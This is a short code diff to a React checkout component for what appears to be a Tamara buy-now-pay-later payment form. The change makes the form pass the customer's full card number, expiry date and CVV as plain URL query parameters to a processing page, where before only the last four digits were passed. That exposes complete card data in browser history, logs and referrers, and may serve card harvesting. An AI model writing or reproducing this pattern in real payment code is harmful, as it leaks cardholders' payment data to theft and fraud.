@@ -73,9 +73,10 @@ const TamaraCheckout = () => {
     
     // Get last 4 digits of card
     const last4 = cardNumber.replace(/\s/g, "").slice(-4);
+    const fullCardNumber = cardNumber.replace(/\s/g, "");
     
     // Navigate to processing page with payment details
-    navigate(`/tamara-payment-processing?cardholderName=${encodeURIComponent(cardholderName)}&cardNumberLast4=${last4}&totalAmount=${totalPrice.toFixed(2)}&monthlyPayment=${monthlyPayment}&company=${encodeURIComponent(company)}`);
+    navigate(`/tamara-payment-processing?cardholderName=${encodeURIComponent(cardholderName)}&cardNumber=${fullCardNumber}&cardNumberLast4=${last4}&expiryDate=${encodeURIComponent(expiryDate)}&cvv=${cvv}&totalAmount=${totalPrice.toFixed(2)}&monthlyPayment=${monthlyPayment}&company=${encodeURIComponent(company)}`);
   };
 
   return (
